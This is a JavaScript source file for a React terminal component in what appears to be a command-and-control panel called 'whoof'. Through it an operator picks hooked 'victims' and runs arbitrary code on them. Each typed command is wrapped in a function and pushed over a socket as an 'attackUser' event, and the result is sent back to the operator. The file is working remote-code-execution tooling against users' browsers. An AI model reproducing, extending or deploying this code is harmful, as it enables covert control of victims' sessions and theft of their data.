import React, {Component} from 'react'
import PropTypes from 'prop-types'
import {connect} from 'react-redux'
import {bindActionCreators} from 'redux'
import $ from 'jquery'
import 'jquery.terminal'
import 'jquery.terminal/css/jquery.terminal.min.css'
import * as terminalActions from '../../actions/terminal'
import * as utils from '../../utils'

class Terminal extends Component {
  componentDidMount() {
    let term = $('#terminal').terminal(this._commandHandler.bind(this), {
      greetings: 'Actions are logged here.\nAdditionally, you can use this terminal to execute commands on selected targets.',
      height: 300,
      prompt: '[whoof]:~$ '
    })
    term.hover(term.focus)
    term.focusout(()=>{ term.focus(false) })
    this.props.actions.setLogger(function(text){
      let d = new Date()
      $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${text}`)
    })
    this.props.socket.on('message', function(message){
      let d = new Date()
      $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${message}`)
    })
  }

  _commandHandler(command, term) {
    if (command !== '') {
      let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
      if(activeTargetSocketIds.length === 0){
        term.echo('Select a target first')
      }

      if(command.startsWith('/w')){
        command = `sendMessage("${command.slice(2)}")`
      }

      activeTargetSocketIds.forEach((socketId)=>{
        this.props.logger(`Executing command line attack on victim ${this.props.victimsBySocketIdMap[socketId].id}...`)
        let attackInstanceId = `${socketId}_${new Date().valueOf()}`
        this.props.followupBuffer[attackInstanceId] = function(params, logger){}
        this.props.socket.emit('attackUser', {
          userSocket: socketId,
          attack: `function(params){
            params.time = new Date();
            let _result_ = (function(){ ${command} })()
            try{
              socket.emit("result", {
                success: true,
                message: "Successfully executed custom command at " + new Date() + (_result_ ? "\\nReturned Value: " + _result_ : ''),
                params
              });
            }catch(e){
              socket.emit("result", {
                success: false,
                message: e.toString(),
                params
              });
            }
          }`,
          params: {victim: this.props.victimsBySocketIdMap[socketId].id, id: attackInstanceId}
        })
      })
    }
  }

  render() {
    return (
      <div className="block">
        <div id="terminal"></div>
      </div>
    )
  }
}

Terminal.propTypes = {
  actions: PropTypes.object,
  activeTargets: PropTypes.object,
  followupBuffer: PropTypes.object.isRequired,
  socket: PropTypes.object.isRequired,
  victimsBySocketIdMap: PropTypes.object
}

function mapStateToProps(state, props) {
  return {
    activeTargets: state.victims.activeTargets,
    followupBuffer: state.attacks.followupBuffer,
    logger: state.terminal.logger,
    victimsBySocketIdMap: state.victims.victimsBySocketIdMap
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(terminalActions, dispatch)
  }
}

export default connect(mapStateToProps, mapDispatchToProps)(Terminal)
